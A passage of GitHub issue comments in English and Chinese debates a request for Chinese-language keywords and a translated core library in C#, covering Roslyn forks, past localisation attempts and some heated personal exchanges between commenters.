The second question, you say in Chinese or other non-native language culture with the keyboard to develop efficiency under, but you ignore the current operating system are using soft keyboard soft keyboard to complete the input characters, the Chinese Pinyin input method, enter Efficiency is not worse than typing in English."
2272	"@qgy123 
朋友,易语言 / 易飞扬 已经停止开发很久了,并且,它们不开源.因为开发[易]系列语言的公司不重视企业应用,和后续发展.所以,没有企业愿意应用它.

现在有很多人对中文编程的概念还停留在非常早期的阶段和水平, 一提中文编程就说易语言等早已停止开发的汉语编程语言.
对汉字输入的印象还停留在,拼音输入法没发明之前的阶段和水平.

Friends, yi 易 language / yi 易 to fly has been developed for a long time, and they are not open source. Because the development of [yi 易] series of language companies do not attach importance to enterprise applications, and follow-up development.Therefore, no business is willing to apply it.

Now there are a lot of people on the concept of Chinese programming still remain in the very early stages and levels, a mention of Chinese programming on language yi 易 to stop the development of Chinese programming language.
The impression of the input of Chinese characters still stays in, Pinyin input method did not invent the stage and level before."
2273	"@ufcpp I agree that it's up to Chinese speakers to develop programming languages in Chinese. I heard about なでしこ before, and seems it's very useful for certain user group and certain tasks. I'm also trying to develop [a simple script language](https://github.com/program-in-chinese/overview/issues/33), hopefully using Chinese grammar/tokens, to solve simple tasks, as a baby step towards Chinese PL.

BTW do you know any open source Japanese programming language that has some popularity?"
2274	@shisoft well china has got more than 1 billion population. even 1% of them (that don't know english) investing here is 1 million developers. (just for fun :))
2275	"@nobodxbodon 
Listed here: https://ja.wikipedia.org/wiki/%E6%97%A5%E6%9C%AC%E8%AA%9E%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%9F%E3%83%B3%E3%82%B0%E8%A8%80%E8%AA%9E

- [Mind](http://www.scripts-lab.co.jp/mind/whatsmind.html)
- [TTSneo](http://tts.utopiat.net/)
- [ドリトル](http://dolittle.eplang.jp/)
- [ひまわり](http://kujirahand.com/himawari/)
- [なでしこ](https://nadesi.com/top/)

I don't know their popularity and openness though."
2276	"@MkazemAkhgary 

> well china has got more than 1 billion population. even 1% of them (that don't know english) investing here is 1 million developers

Ahem... 1% of a billion is 10 million :P"
2277	"@qwas982 Apologies if it seems that your suggestion is meeting with hostility, but really the choice of English for programming is a completely arbitrary one. While it may be very western-centric, for sure, that's still not an argument to switch to Chinese instead. What about all the other languages out there? Why don't they get a version of C# as well?

You can easily imagine a version in Arabic, Spanish, Russian or Urdu."
2278	"Even if MS were to take up this idea and create a new language based on VB.NET and F# but using Chinese grammar the result would not be C#, nor remotely related to C#.

I'm curious what such a thing would look like.  Sure, C# (and many programming languages) use English tokens and maybe a tiny bit of English grammar but it's far from natural language.  Even COBOL is stilted, at best.  Most of the time those words have little equivalent meaning outside of programming and their combination would be nonsense to an English speaker outside of their context.  I can't imagine that a programming language geared towards another written language would be very different."
2279	"@HaloFour,

Didn't MS do something like this with Visual Basic? I seem to recall that localized version of the keywords were supported. But it then caused problems with identifier names in libraries from one country clashing with keywords in another. Or did I just make that up?"
2280	"@Richiban 
你好,朋友
我的意思并不是完全否定用英语编程,也不是否定西方文化.
我的意思是增加一种选择,因为这里有更宽广的市场,和无限的可能.在中国,想要学习编程但又不会英语的人有很多,并且,因为受到政府的高压统治和信息封锁,普通的大众并没有机会和精力研究程序设计和程序语言. 编程对普通中国人来说是一件遥远的事.

我设想的是,如果打破了交流这一障碍,就会让更多的普通人学习和使用编程.交流有很多种情况,人与人之间的交流,人与计算机之间的交流.
对于其他自然语言,Arabic, Spanish, Russian 也可以增加这一种选择,也就是本地化,母语化,就像国际化的程序或操作系统一样,提供当地的语言版本.

编程就是表达想法,那么用母语表达,无疑会更加高效和准确.

Hello,friend

I do not mean to complete negative programming in English, nor does it complete negative Western culture.
I mean adding a choice because there is a broader market, and infinite possibilities. In China, there are a lot of people who want to learn programming but do not have English, and because of the government's high pressure rule and information blockade , The general public did not have the opportunity and energy to study or research the programming and programming language. Programming for ordinary Chinese people is a distant thing.

I envisage that if you break the barriers to communication, it will allow more ordinary people to learn and use programming. There are many kinds of exchanges, interpersonal communication, communication between people and computers.
For other natural languages, Arabic, Spanish, and Russian can also add this option, that is, localized, native language, like an international program or operating system, providing local language versions.

Programming is to express ideas, then the expression in the mother tongue, will undoubtedly be more efficient and accurate.
"
2281	"请看我的Z语言 http://www.zyuyan.org/zlogo3/index.php

说明:第一个zlogo小程序

开始绘图:
	窗口设置标题为""第一个zlogo小程序""
	小海龟的画笔的颜色=绿色
	小海龟左转60度
	小海龟前进200"
2282	"@DavidArno 

> Didn't MS do something like this with Visual Basic? I seem to recall that localized version of the keywords were supported.

Not to my knowledge.  I think Apple did something like that with AppleBasic early on but the support was removed."
2283	vIneH neH tlhIngan! DaHjaj QaQ jaj ngoq!
2284	"@MgSam

https://esolangs.org/wiki/Var'aq"
2285	"开始绘图:
	(旋转绘制三角)12次；
	
过程:旋转绘制三角
	小海龟左转90度,小海龟前进200
	小海龟左转120度,小海龟前进200
	小海龟左转120度,小海龟前进200"
2286	"@HaloFour 

你好,朋友.

我并不是说 ,程序语言应该完全的像自然语言一样,我没有表达这个意思.

我的意思是,tokens使用与C#中(或其他程序语言)英语等价的词汇就行了.

我观察到,基于虚拟机 xVM ( x=java,javascript,python,.net;) 的语言,大多已经使用了很多自然语言中的词汇作为tokens.所以可以等价替换为其他自然语言的词汇是一种可能性.
用自然语言词汇作为 tokens.

Hello,friend

I am not saying that the programming language should be exactly like the natural language, I did not express this meaning.

What i mean is that the token is used with the equivalent English word in C #. (Or other programming language)

I have observed that based on the virtual machine xVM language (x = java, javascript, python, .net;), most have used a lot of natural language vocabulary as tokens. So it is possible to replace vocabulary with other natural language equivalently.
Use natural language vocabulary as a token."
2287	"@qwas982 

Have you considered forking Roslyn and trying to replace the English keywords that it expects with Chinese identifiers instead?  It'd be an interesting experiment, if nothing else.  There might be some Unicode hurdles but otherwise I imagine that it would be somewhat straightforward.

I think that one of the main reasons that MS shouldn't go down this path is that it creates multiple dialects of the same language.  Where that becomes a problem is that what is a legal identifier in one dialect might be a keyword in another, causing a compiler error.

AppleScript originally went down this path.  Not only did they permit keywords to be replaced with their native equivalents but it sounds like they also allowed some modifications to the grammar to better support SOV languages like Japanese.  But it found limited adoption and where it was adopted scripts became a mess of mixed languages and Apple eventually dropped support.  Even if there were a Chinese flavor of C# I wouldn't expect it to reach wide support and what support it found would be siloed off from the rest of the C# community as a whole."
2288	"Looking at the example in https://github.com/dotnet/csharplang/issues/993#issuecomment-336028834, it appears this request is a combined request for Chinese-language keywords and Chinese-language base class library (BCL).

* Using Roslyn, it would not be difficult to create a compiler which allowed Chinese-language keywords. However, this is only a small minority of the problem.
* Translating the BCL alone would require enormous effort. Since the goal is creating a natural fit for Chinese-speakers, this translation could only be accomplished by individuals who are proficient in both Chinese and programming in English. This does not count open source projects like Json.NET, and may not be possible at all for closed-source libraries like WPF.

For the set of users interested in programming, it may actually be less net work for all of those users to learn the English form of the language than to create and maintain culture-specific variants of the language and popular libraries."
2289	"FYI here is the work that's more or less related to the ideas here:
[Change keywords of existing programming languages to Chinese](https://github.com/program-in-chinese/overview/issues/25)
[Translate core libraries in C#](https://github.com/program-in-chinese/HuanXiang/tree/master/Cjing.Net/%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B)

@jonechenug indeed we are practicing naming in Chinese (or a dialect) in as much languages as possible in this group:
[Just a handful of real project that has large enough code base](https://github.com/program-in-chinese/overview/issues/6)
Including wrapping popular API in Chinese, like JUnit4, and some experimental projects using Chinese naming:
https://github.com/program-in-chinese/Java
https://github.com/program-in-chinese/javascript
And writing programming tutorial using sample programs with Chinese naming:
https://github.com/program-in-chinese/java_in_hours_chn

> because of the government's high pressure rule and information blockade , The general public did not have the opportunity and energy to study or research the programming and programming language. 

Please, leave politics out of this discussion, which is controversial enough already!"
2290	"I'm echoing @sharwell:

 The problem is not that C# or any other programming language is in English. The languages themselves are very small, usually only around 50 words or so. The problem is that libraries - distributed packages of code - are usually only documented in English. This is mostly true in the open-source world, as some big companies do provide documentation in other languages.
"
2291	"@sharwell I agree creating Chinese version for all the existing BCL is impossible. Still, IMO it's feasible to start with the most popular libraries and frameworks, as most projects use maybe 10-20 top libraries in one language, and all others are more like 'long-tail'. One experiment I did is making a Chinese wrapper for [JUnit4](https://github.com/program-in-chinese/junit4_in_chinese/blob/master/src/test/java/com/github/program_in_chinese/junit4_in_chinese/%E6%96%AD%E8%A8%80%E6%B5%8B%E8%AF%95%E7%B1%BB.java). Before that, I actually tried to create Chinese version for core JDK library, but the workload is obviously too much for single developer, even though I limited the scope to `java.util` only. 

In my view one main benefit of creating Chinese BCL is **improving program readability**, for native Chinese developers working on domestic projects, which most likely won't involve any English-speaking developers in their total lifecycle. Other than that, using Chinese naming like @jonechenug's example [above](https://github.com/dotnet/csharplang/issues/993#issuecomment-336027755) is definitely a most direct way to improve readability and maintainability, for those certain projects. As an example, [here](https://github.com/program-in-chinese/assembler-in-chinese-experiment/blob/master/src/cn/org/assembler/%E6%B1%87%E7%BC%96%E5%99%A8%E7%B1%BB.java)'s a piece of an unfinished ASM assembler using Chinese naming in Java.

@HaloFour replacing keywords is doable for sure. BTW [here](https://github.com/program-in-chinese/overview/issues/25) is a list of languages of which Chinese version keywords are added. Like @Clockwork-Muse pointed out, there are around 50 keywords in all. Similarly with all other PL. Besides, the language grammars are designed to fit the keywords in the beginning, so IMO translating them may not improve much readability for existing programs. Nevertheless it could be more friendly to native learners new to programming.

@Richiban interestingly I imagined a programming language that supports localized keywords as a built-in feature. I just learnt there was failed attempt, like AppleScript mentioned [above](https://github.com/dotnet/csharplang/issues/993#issuecomment-336165002), but I suppose some similar effects can be achieved by a 'light-weight' approach, editor plugins, as [mentioned](https://github.com/dotnet/csharplang/issues/993#issuecomment-336021626) by @qrli .

@ufcpp thanks for the list. I took a quick look and seems all of them are not open-source. Pitifully all the existing commercial Chinese PL are also close source, as far as I know.

"
2292	"Perhaps I misunderstand but a large part of the argument for creating a Chinese C# seems to be that the standard C# is made by westerners that do not understand Chinese culture/people. But if that is the case, why are you asking those same westerners to create a Chinese programming language? Wouldn't any other language they create also have the same problems? 

Generally speaking I think more languages is a good thing and if people find it easer to program in their native language, then someone should fill that need, but I just don't think that is something the C# team should do. (I'm not a English speaking native, but i'd never want to program in my native language, but I suppose I am a ""westerner"" though)

This seems totally doable with Roslyn and perhaps some post compilation though, Uwp already project apis to different programming languages, and it seems like you could generate Chinese language wrappers around the BCL classes, but again, i think this is outside the scope of c# itself.
"
2293	"@nobodxbodon - .... not that there's much in the way of ""real"" English grammar in most programming languages.  There are far more abstract or domain-specific symbols.  That's ignoring the fact that there's a higher mental load in learning the basic concepts and domain knowledge.
"
2294	"@Clockwork-Muse 
> not that there's much in the way of ""real"" English grammar in most programming languages.

I agree that, like many other mentioned, PLs are far from natural language. However, even these PL grammars has a lot of styles that doesn't exist in Chinese written languages (or other Asian languages like Japanese or Korean). One simple example is the space as separator. That being said, whether it's reasonable to use space as separator in a Chinese PL is a totally different topic. It's just an example to show even the grammar that seems neutral enough has the flavor of English grammar, that you may not realize.

> There are far more abstract or domain-specific symbols. That's ignoring the fact that there's a higher mental load in learning the basic concepts and domain knowledge.

If you refer to my previous comment `Nevertheless it could be more friendly to native learners new to programming.`, I don't see how the fact you described would invalidate it. I agree there're huge efforts required to become a good programmer, other than just learning the language itself. But that doesn't mean we don't need to make learning the language itself easier. That being said, whether or how to 'localize' the existing PL could make learning language easier for native learners is another topic, which very likely won't be verified until being tried out.

@aL3891 even though I'm also not sure how much benefit a localized version of C# would help new learners or current professionals, it doesn't mean it's not a potential selling point for local market. I'm only imagining here, but say C# has a proper Chinese dialect, even if it'll only be used as educational tools for elementary school students in China (yes nowadays they start teaching programming that early, not that I like it), it will give C# some advantage in the real market over other languages that don't have this feature."
2295	"This request is too vague to be actionable. We need the Chinese community - that means you, the original poster - to tell us exactly what this would mean for the language. What, exactly, would you like changed? I don't imagine that the developers of C# - none of them native Chinese speakers - are in the best position to design what you seek.

I am aware of one shortcoming for Chinese users right now - Unicode surrogate pairs are not treated as valid characters in an identifier. I think of that more as a compiler bug than a language shortcoming. But I haven't heard any complaints about it from users.
"
2296	"@gafter that's great question. Based on the poster's [sample](https://github.com/dotnet/csharplang/issues/993#issuecomment-336028834), I see at least two features:
- support Chinese version of all the keywords, like `class`->`类`, `static`->`静态`, `public`->`公开`
- support Chinese version of built-in types and core library, like `String`->`字符串`, `Console`->`控制台`

To give some context, there's a commercial Chinese PL, mentioned by previous comment, that has similar features. Sample [here](http://www.dywt.com.cn/eftx/qrlxhnml.htm)
![screen shot 2017-10-12 at 7 57 43 pm](https://user-images.githubusercontent.com/392497/31528363-ac4f1fc4-af87-11e7-8639-e080b7d03a02.png)


BTW could you please share some reference/issue about the unicode surrogate pair problem? I suppose you don't mean using Chinese characters as identifier like sample [above](https://github.com/dotnet/csharplang/issues/993#issuecomment-336027755)?"
2297	"Well, if and when someone will pick on that work he/she won't have to think too much about the name as Chinese# fits well. 😆 

But really, I think that this kind of thing should be done through editors' extensions or even a transpiler that on one hand understands C# and on the other hand understands Chinese and then when you write Chinese it transpiles everything to idiomatic C# file, this is better because this will at least allow people that can't understand Chinese the ability to read the transpiled code."
2298	"@gafter 
Surrogate pairs in source code will almost never be used in source codes.
1. Only a small percent of companies/organization use Chinese identifiers in code. But it is not rare to use Chinese comments.
2. The Chinese characters which need to be encoded in surrogate pairs are rarely used one. Many of them are dead characters, which are only used in ancient archive or research. Programmers generally do not know them at all.

However, the later added fancy emoji characters may pose a real issue, if a programmer tries to use them in identifier for fun."
2299	"@eyalsk There is a bigger problem that many concepts do not have a translation (a common translation at least). E.g. we just speak `GPU shader` in a Chinese sentence. Same for `iPhone`. There are too many new concepts/terms showing up each day. And they may fade out even before a common translation is adopted.

In one TechEd years before, the presenter said ""create a `library`"" when he created a class library, and the Chinese translation on screen is 建一个`图书馆` ""build a (real physical) library"", even though there is a common translation `库`. LOL"
2300	"> * support Chinese version of all the keywords, like `class`->`类`, `static`->`静态`, `public`->`公开`
> * support Chinese version of built-in types and core library, like `String`->`字符串`, `Console`->`控制台`

Based on this, I can imagine a compiler extension that defines global aliases for keywords in this manner. That wouldn't address the grammar of the language, but if enough of the intent is conveyed, that hopefully shouldn't matter too much."
2301	"@eyalsk `Chinese#` good one :) 
I thought you meant auto-translating the keywords and core libraries only (which seems feasible), but seems I misunderstood. If developer chooses to use Chinese version of C#, they most likely will use Chinese naming for most of the variables/methods/classes, etc, with exceptions of the new terms with no good translation. As @qrli's 'library' example, the difficulty of translating Chinese naming in source code will be comparable to translating natural language. In spite of that, I would imagine that those programs are not likely to be meant to target non-Chinese speaking developers (or even open source) anyways. Otherwise the programmer would have not chosen the Chinese version in the first place.

@Joe4evr I wonder if it's proper to put the System classes and their methods (the second part, String, Console, etc) in the alias table in compiler extension?"
2302	"@nobodxbodon 

> some reference/issue about the unicode surrogate pair problem

https://github.com/dotnet/roslyn/issues/13474
"
2303	"@qwas982 你是猴子请来的逗逼么？ 没事儿捣什么乱？

![2017-10-13 14 28 45](https://user-images.githubusercontent.com/2059006/31533056-2648de22-afb6-11e7-98f2-d1924c3a0e00.png)


"
2304	"@ufcpp thanks for the reference. As @qrli stated [above](https://github.com/dotnet/csharplang/issues/993#issuecomment-336339990) I don't think that issue is a blocker for this feature request, even when taking into account of naming identifiers in Chinese.

@micli could you be more specific please? I don't see a problem with your sample code."
2305	 **Chinese programming is really ugly and difficult to write.** 😂😂😂 
2306	@Meowv could you share your experience of programming in Chinese? In my own practice, the biggest inconvenience comes from inputting code in IDE, including auto-completion. But that's not directly related to this issue. And I don't feel my program with Chinese naming ugly at all. If anything, it's more readable and easier to understand at first sight for me, a native Chinese speaker, comparing to programming in English. 
2307	@nobodxbodon Well, I don't know Chinese or anything about it so I wouldn't know what are the challenges but I'm sure there are some, however, in my opinion, whatever the solution is the language shouldn't change because of that. :)
2308	"写个单纯替换 token 的编译器是什么很难的事情吗，破事儿水

好像跟一句翻译看上去和谐一点
~~Write a pure replace token compiler is a difficult thing? f*ck thing water~~
I don't think it is difficult to write such a compiler by yourself."
2309	不是替换，请看源码
2310	"Z语言网址
http://www.zyuyan.org/index.php
"
2311	"//测试矩形构造函数

导入:Z语言系统, Z标准包/绘图/形状
使用:控制台,补语控制

唯一类型:
启动:
	JX=矩形(长度：100，宽度：80)
	打印JX的宽度
	等待按键"
2312	"This is not the place for you guys to talk about it anyway.
If you want a localized version of csharp, make one yourself - make your own repo, setup your own bulletin board, etc - but do not discuss it here. Keep in mind that this is csharp's repo & this is the place for the csharp language **itself**."
2313	"@eyalsk I don't think this would change current C# in any way, even if the feature request is accepted. It might add support for multilingual keywords and built-in types, but the existing language features should stay the same.

@Means88 IMO anything we discuss here is technically feasible, otherwise the discussion would have ended much earlier. @bctnry for sure we could do that without discussing here, but I feel it makes more sense to first check with existing global community, to gather feedback and concerns, find consequenses we don't foresee, see if there's similar requirements, get suggestions about best approach and potential help even. This is currently labeled as `feature request`, so I suppose it's at least somewhat related to the repo. 

Besides, as I illustrated [above](https://github.com/dotnet/csharplang/issues/993#issuecomment-336308369), IMO the potential commercial benefit makes it worthwhile to discuss through. After all, for new learners who don't know much about computer or PL, any shiny language feature is dimmer than the ""look"" of the programming language, which is the same as any other commercial products. That being said, whether this feature fits in the strategy or roadmap of C# is another matter, but that's part of what we hope to find out here.

Some previous comments pointed out the failure of similar attempt in AppleScript. IMO it can be totally different story for C#, in China at least. First of all, Windows OS occupies [> 90%](http://tongji.baidu.com/data/os) of desktop market, and AppleScript is limited to MacOS (it has 5%), as far as I know. Second, from @HaloFour's [description](https://github.com/dotnet/csharplang/issues/993#issuecomment-336165002) it sounds AppleScript allowed a lot of flexibility in the translating and transforming, which in large results in the compatiblity issue and chaos. I suppose a more controlled way may work out differently."
2314	"The C# language team have expressed numerous times that they don't want to create dialects of the C# language as that would fracture the user base.  The notion of localized keywords (or grammar) does nothing but create incompatible dialects.  It's not worth the risk, and it frankly doesn't solve the bigger problem that the BCL and vast majority of the libraries are still written in English.  I'd say that the likelihood that you'll convince Microsoft to put the effort into translating any of that into any other language would be vanishingly tiny.

That said, Roslyn and CoreFX are both opensource.  So are a number of frameworks like ASP.NET.  If a portion of the community wished to fork them both and translate them they would be free to do so.  It's been suggested that there is a significant pool of Chinese-speaking developers which might have an interest in such a project.  Having experts in the written language who already know C# and the BCL would have a much, much higher chance of success than @gafter and @MadsTorgersen arbitrarily picking alternative translations from Bing Translator."
2315	"@nobodxbodon - Windows might have ~90% of the desktop market share, except:

 - Most programs, despite the introduction of C#'s UWP, are probably still C/C++
 - There might be more mobile devices than desktops, where Windows has a negligible market share.  Java (via Android) dominates.
 - The majority of web servers are probably still running some variant of Linux, where the primary language to develop web applications is decidedly **not** C#.  "
2316	"@HaloFour 
> The C# language team have expressed numerous times that they don't want to create dialects of the C# language as that would fracture the user base.

Please excuse my ignorance here as I'm not familiar with the community. Would you please share some references or other similar issues that the C# language team closed already? I'd like to learn the concerns and reasons behind it. As I [mentioned](https://github.com/dotnet/csharplang/issues/993#issuecomment-336224486), IMO there's clearly a void to fill, as there are a lot of real-world domestic projects in China that only involve Chinese-speaking developers. Not to mention the educational usage. So I'm curious what drawback defeats that potential gain. The workload of maintaining a different version of BCL is indeed intimidating, but I suppose it would be significantly lower than that of MSDN documents.

As I mentioned briefly in the last part of my previous [comment](https://github.com/dotnet/csharplang/issues/993#issuecomment-336522782), IMO it could have higher chance to be more successful than Applescript if the translation or customization is more controlled and ideally led by C# team, compared to letting many different teams customizing Roslyn in their own way, resulting in even more dialects.

@Clockwork-Muse 
> Most programs, despite the introduction of C#'s UWP, are probably still C/C++

Without statistics by hand, I'd say that gives more reason to add this feature in C# instead of C/C++, if the goal is to replace C/C++ with C#.

> There might be more mobile devices than desktops, where Windows has a negligible market share. Java (via Android) dominates.

Similar applies. At least Java doesn't have this feature now. So there's a chance there. For sure it comes with risk. 

> The majority of web servers are probably still running some variant of Linux, where the primary language to develop web applications is decidedly not C#.

According to findings like [here](https://www.zhihu.com/question/56530204/answer/149411631)(in 4 of top banks in China, 3 uses Windows Server), I suppose it depends on domains and business. Again, even if it's not No.1, doesn't it give more reason to improve? IMO, comparing to making a difference in the performance benchmark, this 'soft' feature could be less technically challenging and have much more marketing value.
"
2317	"@nobodxbodon 

Here's a simple one:  https://github.com/dotnet/roslyn/issues/5622#issuecomment-145580621

Your goal is to make a completely incompatible user-defined dialect of the C# language.  That runs quite contrary to the goals of this repository which are to define a single specification and standard for the language.  That is clearly an impossible task if all of the keywords can be redefined.

I don't doubt that there is a void to fill, but this isn't the place to fill it.  The idea that the C# language specification will be amended in order to make it a customizable language is not a feasible one.  The team has a massive backlog of potential features to consider, design and implement *in English*, I doubt that they have the means or resources to attempt to localize to any other language, especially one for which not a single member is a native speaker."
2318	"@HaloFour thanks for the reference. IMHO here are differences between the two. 
- referred one is much more flexible thus harder to avoid incompatibility.
- this one serves clearer and larger user group.

> the goals of this repository which are to define a single specification and standard for the language. That is clearly an impossible task if all of the keywords can be redefined.
...
The idea that the C# language specification will be amended in order to make it a customizable language is not a feasible one. 

As I mentioned above, we are not looking for a new mechanism like Applescript for user developers to arbitrarily define keywords by themselves. Instead, it's closer to an i18n effort, using maybe a static alias table.

> especially one for which not a single member is a native speaker.

Indeed it most likely require community efforts to pull this off. We'd very much appreciate any suggestion from the C# team where or how to start.

"
2319	"@nobodxbodon Localization won't change the language in terms of how you express things but reading source code in Chinese or any other language when people wouldn't be able to read it is problematic and I don't think that computer languages should be localized at all unless it's for an academic experiment or something.

The way I see it is this proposal asks to invest resources that will introduce a problem and then it will need even more resources to solve that problem so why do it at all?"
2320	@eyalsk in my view it's similar to other i18n efforts. Why not use English in all the log messages then? Besides, most of the popular PL already support unicode naming anyways, which (very thankfully) allows developers to use naming in their native languages resulting in more readability. I don't see much difference in localizing keywords.
2321	"@nobodxbodon

AppleScript didn't allow end users to define their own keywords, it had a couple specific localized dialects.  It was exactly what you described and it was not a good idea.

I concur that this would not be technically difficult to accomplish.  It just doesn't belong in the C# language specification, thus doesn't belong here.  Maybe bring it up on Roslyn but I wouldn't expect it to fly there either.  Perhaps they can point you in the direction of how it could be implemented in a fork, though.

I understand what it is you want to accomplish and it is a noble goal.  If I were a native Chinese speaker I would likely greatly appreciate localized support for some major programming language.  However, any such language would be a fractured user base and producing source entirely incompatible with the larger community.  That's not a positive end result."
2322	"@nobodxbodon Well, it's a matter of opinion but personally I dislike seeing names, comments, logs in Hebrew and even go as far as selecting English UI for all of my programs but yeah, even if I really, really loved it I wouldn't go as far as proposing that a computer language would have localization for Hebrew, probably more reasonable to write it myself than asking for the design team responsible for said language to put the engineering efforts required for it.

Edit: Typo."
2323	"@HaloFour I suppose it's technically possible to make the new dialect(s) all compatible with each other, but I see your belief that it would result in fractured user base anyways. Thanks for your time and suggestion.

@eyalsk thanks for sharing. 

I wish the discussion could have started in a different way. Nevertheless thanks all for the tolerance and patience to let me share my view."
2324	"@nobodxbodon 

Probably not from a source level, at least not if implemented as an alternative set of localized keywords.  But at least at the binary level it would all be IL, even if the public identifiers would likely be unintelligible.

Like I said, I think this is a noble goal.  Bringing programming education to the masses is a great idea and I do think that a language, grammar and culture barrier creates a steep curve in non-English and especially non-Western countries.  I'd advocate any project that would enable this and Roslyn might be a good starting point given that it's open source.  I just don't feel that it belongs officially in the C# language specification proper and I can't imagine that Microsoft themselves would run with it, at least not with the C# team.  I think that it would take a concerted effort by the communities that would like to see this happen.

I wonder if such a project might borrow a page from [Intentional Programming](https://en.wikipedia.org/wiki/Intentional_programming) or JavaScript transpilers and instead of trying to recreate C# instead create a localized ""view"" over C# where the language and syntax could be more closely designed to match the syntax of the spoken/written language but the end result is still normal standard C#.  It achieves the goal of providing the lower barrier to entry for new programmers but it also can help those same people learn the actual programming language by being able to view the results.  This might require more complex tooling, though."
2325	"To the non-Chinese posters in this thread:
  Be kindly warned that this is never ending topic once it shows up, no matter what you say."
2326	"@qrli 
@jonechenug
@shisoft 
@qgy123 
@micli
@Meowv
@Means88
@bctnry

这些账号，如果是中国人或使用汉语的人，100%是逆向种族主义者，他/她们瞧不起中文字符，瞧不起自己的文化，可能是跪久了，已经站不起来了。不过是一些没骨气的软蛋罢了。已经习惯于依附于别人，软弱无能的弱者思维罢了。
如果不是中国人或国籍非中国这个国家的人，那么，有很大可能是种族歧视者。
因此，这些账号的观点不足为据。也可以看出，他们的观点没有多少建设性。只有贬低、鄙夷、傲慢与偏见。
-------------------------------------------------------
@aL3891
@gafter
@HaloFour
@sharwell 
朋友，你好

抱歉，没有及时回复，因为中国有信息封锁的原因，我不能及时登陆github，所以无法查看和回复最新的评论。

我并不是希望C#完全使用自然语言去改变，我表达的意思是，将其中的 【标示符-Identifier】 【标记-token】 增加本地化，所用词汇为当地使用母语的人常用的词汇。阿拉伯数字和数学符号不需要转化为母语。对词法分析和语法分析也使用原有方法和模式，仅仅只是改变书写的字符。而【库-library】的问题可以通过翻译注释等方式增加本地版本，这个让当地人自己翻译就行，无需官方的开发团队，当然，如果官方的开发团队能协助进行，那自然最好了。

如果微软官方的C#开发团队或 .net 开发团队不愿做出这样的改变，我能理解，但请注意中国庞大的市场和windows应用商店中不够丰富的应用问题，身在中国的我和与我有一样对中文编程热心的开发者，我们建立了即时聊天的群来研究，我们可以做出实现，如果官方的开发团队能告诉我怎么转换【标示符-Identifier】 【标记-token】 ，在哪些文件和哪一行修改，我会很感谢你的热心帮助。我们可以自己动手行动，然后提交修改，修改遵从C#和.net官方的开源协议。
请给出指导和修改的向导readme。谢谢。"
2327	"@HaloFour 

> Probably not from a source level, at least not if implemented as an alternative set of localized keywords.

I probably missed something obvious here, but as I imagine, the compiler would support all the keywords in different locales. So even a mixture of source files with different set of localized keywords in each would be acceptable.

> Like I said, I think this is a noble goal. Bringing programming education to the masses is a great idea and I do think that a language, grammar and culture barrier creates a steep curve in non-English and especially non-Western countries. I'd advocate any project that would enable this and Roslyn might be a good starting point given that it's open source.

Thanks a lot for your understanding. It means a lot to me.

>  I just don't feel that it belongs officially in the C# language specification proper and I can't imagine that Microsoft themselves would run with it, at least not with the C# team. I think that it would take a concerted effort by the communities that would like to see this happen.

I agree now. I've no problem to continue discussion somewhere else that's more proper.

Again, I'm so very grateful for all the technical discussion without prejudice here. As far as I know Chinese PL has yet gain decent recognition or commercial usage in China. Lots of factors result in some sharp disagreements between some of those who pro and against programming in Chinese. For myself, I appreciate all the open-minded suggestion and technical critics. I've been and will continue to agree to disagreement, without enforcing any ideology. 

@qrli I won't overindulge in the hospitality here."
2328	"还看得出来是嘲讽你啊，不容易啊，你不圈我出来扣上逆向种族主义者这顶帽子我还真懒得理你这种跳梁小丑，我不嘲讽中国人，可惜我嘲讽你。
怎么？被戳中痛点就开始人身攻击了？你这种人才是跪着久了，觉得自己那点胃炎比谁都值钱，呵呵"
2329	"@qwas982 也许你错过了一些之前的讨论. fork编译器库和修改它使其支持中文标识符等问题更适合在Roslyn项目讨论. 请不要继续进行非技术性的中文编程之争. 这对这个问题毫无建设意义. 谢谢.

@qwas982 Maybe you missed some previous discussion. Forking and changing the compiler and modifying it to support Chinese keywords is better to be discussed in Roslyn project, instead of here.

Please stop the non-technical arguments on programming in Chinese. It doesn't add constructive value to resolving the issue. Thank you all."
2330	"@qrli
@jonechenug
@shisoft
@qgy123
@micli
@Meowv
@Means88
@bctnry

**These accounts, if the Chinese people or the use of Chinese characters/ 
Mandarin people, 100% is the Reverse racist, he / she look down on/ despise Chinese characters/Mandarin, look down/despise on their own culture, may be knee/genuflect for a long time, can not stand up.
If it is not a Chinese people or a non-Chinese country, then it is highly likely that it is Racial discrimination.
Therefore, the views of these accounts is not enough. It can also be seen that their views are not constructive. Only to belittle, contempt, arrogance and prejudice.**
-------------------------------------------------- -----

@aL3891
@gafter
@HaloFour
@sharwell

Hello friend

Sorry, no timely reply, because China has the reasons for the blockade of information, I can not visit github in time, so can not view and reply to the latest comments.

I do not want C # to use natural language to change completely. I mean, I mean the addition of the 【标示符-Identifier】 【标记-token】 to the localized vocabulary used by the native language. Arabic numerals and mathematical symbols do not need to be converted to native language. Lexical analysis and grammar analysis also use the original methods and patterns, just to change the writing of characters. And the 【库-library】 problem can be translated by way of the local version of the increase, the local people to translate their own on the line, without the official development team, of course, if the official development team can help, it is the best natural.

can you tell me? can you teah me? How to change,How to modify it.

If Microsoft's official C # development team or .net development team is reluctant to make such a change, I can understand, but please note that China's huge market and windows application store is not rich enough to application the problem, There are the same enthusiastic developers of Chinese programming-中文编程, we have established a real-time chat group to study, we can make the implementation, if the official development team can tell me how to convert 【标示符-Identifier】 【标记-token】, in which File and which line to modify, I would appreciate your enthusiastic help. We can act on our own, and then submit changes, modify compliance with C # and. Net official open source agreement.
Please give guidance and modify the wizard readme. Thank you."
2331	"@nobodxbodon 

好，我明白了。"
2332	"This discussion is going haywire.
There is one thing need to clarify. If your propose is just to replacing token/symbols, there will be a huge problem that you have to translate all of those the library, class names, functions, etc., to make them look like the language you expected.
It's not just a business decision though, this will make the eco system fall apart just for make a favor of small group of people. 
There is one alternative, that is to make C# or other language a intermediate, translated from Chinese tokens. But still, all of those third party libraries are not the language you expected, you need to translate them either.
There is a lot of engineering problem, not what you can achieved by shaming or accusing raciest."
2333	"@shisoft 不好意思，指责和建议我是分开了的。

指责归指责。建议归建议。有些跳梁小丑自己认识不到自己是小丑，他们没有自知之明，所以我善意提醒他们一下，当然，提醒完了就不想再鸟那些垃圾了。这里专注于C#前端的中文化。"
2334	"不要理会唱衰和反对中文编程的人,中文编程很有必要.编程发展到现在已经走到了一定的困境和局限,因为编程为西方文化掌握,现在需要突破.或横向或纵向.
